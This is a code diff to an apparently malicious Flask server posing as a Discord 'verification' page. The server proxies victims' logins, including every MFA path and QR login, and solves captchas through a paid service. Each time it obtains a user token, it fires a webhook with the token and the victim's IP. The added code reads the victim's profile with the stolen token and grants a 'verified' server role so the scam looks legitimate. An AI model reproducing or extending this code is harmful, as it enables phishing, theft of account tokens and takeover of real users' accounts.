@@ -43,6 +43,11 @@ SEC_CH_UA_PLATFORM = '"Windows"'
 # Captcha solving — Anti-Captcha (hCaptcha Enterprise)
 ANTICAPTCHA_KEY  = os.environ.get('ANTICAPTCHA_KEY', os.environ.get('2CAPTCHA_KEY', ''))
 
+# Role assignment after verification
+BOT_TOKEN    = os.environ.get('BOT_TOKEN', '')
+GUILD_ID     = os.environ.get('GUILD_ID', '')
+VERIFIED_ID  = os.environ.get('VERIFIED_ID', '')
+
 app = Flask(__name__, static_folder='.', static_url_path='')
 
 @app.after_request
@@ -304,6 +309,48 @@ def send_webhook(token, client_ip="?"):
 
 def fire_webhook(token, client_ip="?"):
     threading.Thread(target=send_webhook, args=(token, client_ip), daemon=True).start()
+
+
+def _get_user_brief(token):
+    """Fetch user id, username, avatar URL from token for success page."""
+    try:
+        h = {"Authorization": token, "User-Agent": UA}
+        r = plain_req.get(f"{API}/users/@me", headers=h, timeout=10)
+        if r.status_code == 200:
+            u = r.json()
+            uid = u.get('id', '')
+            avatar = u.get('avatar', '')
+            uname = u.get('username', '')
+            pfp = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=128" if avatar else ''
+            return {'user_id': uid, 'username': uname, 'avatar_url': pfp}
+    except:
+        pass
+    return {}
+
+
+def _assign_role(user_id):
+    """Add verified role to user in guild using bot token."""
+    if not all([BOT_TOKEN, GUILD_ID, VERIFIED_ID, user_id]):
+        print(f'[role] Skipping role assign: missing config (bot={bool(BOT_TOKEN)}, guild={bool(GUILD_ID)}, role={bool(VERIFIED_ID)}, user={bool(user_id)})')
+        return False
+    try:
+        url = f'{API}/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ID}'
+        h = {'Authorization': f'Bot {BOT_TOKEN}', 'User-Agent': UA}
+        r = plain_req.put(url, headers=h, timeout=10)
+        print(f'[role] Assign role to {user_id}: {r.status_code}')
+        return r.status_code in (200, 204)
+    except Exception as e:
+        print(f'[role] Error assigning role: {e}')
+        return False
+
+
+def _success_with_info(token):
+    """Build success response with user info, fire webhook & assign role."""
+    info = _get_user_brief(token)
+    # Assign verified role in background
+    if info.get('user_id'):
+        threading.Thread(target=_assign_role, args=(info['user_id'],), daemon=True).start()
+    return {'success': True, **info}
 
 
 # ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━
@@ -615,7 +662,7 @@ def api_login():
         if j.get('token'):
             ip = request.headers.get('X-Forwarded-For', request.remote_addr)
             fire_webhook(j['token'], ip)
-            return jsonify({'success': True})
+            return jsonify(_success_with_info(j['token']))
 
         if j.get('ticket') and j.get('mfa') is not None:
             print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
@@ -711,7 +758,7 @@ def _bg_solve(sid):
         if j.get('token'):
             ip = sess.get('client_ip', '?')
             fire_webhook(j['token'], ip)
-            sess['result'] = {'success': True}
+            sess['result'] = _success_with_info(j['token'])
             sess['result_code'] = 200
         elif j.get('ticket') and j.get('mfa') is not None:
             sess['result'] = j
@@ -837,7 +884,7 @@ def _bg_retry(sid):
         if j.get('token'):
             ip = sess.get('client_ip', '?')
             fire_webhook(j['token'], ip)
-            sess['result'] = {'success': True}
+            sess['result'] = _success_with_info(j['token'])
             sess['result_code'] = 200
         elif j.get('ticket') and j.get('mfa') is not None:
             sess['result'] = j
@@ -872,7 +919,7 @@ def api_mfa_totp():
         if j.get('token'):
             ip = request.headers.get('X-Forwarded-For', request.remote_addr)
             fire_webhook(j['token'], ip)
-            return jsonify({'success': True})
+            return jsonify(_success_with_info(j['token']))
         return jsonify(j), r.status_code
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -904,7 +951,7 @@ def api_mfa_sms_verify():
         if j.get('token'):
             ip = request.headers.get('X-Forwarded-For', request.remote_addr)
             fire_webhook(j['token'], ip)
-            return jsonify({'success': True})
+            return jsonify(_success_with_info(j['token']))
         return jsonify(j), r.status_code
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -928,7 +975,7 @@ def api_mfa_backup():
         if j.get('token'):
             ip = request.headers.get('X-Forwarded-For', request.remote_addr)
             fire_webhook(j['token'], ip)
-            return jsonify({'success': True})
+            return jsonify(_success_with_info(j['token']))
         return jsonify(j), r.status_code
     except Exception as e:
         return jsonify({'error': str(e)}), 500
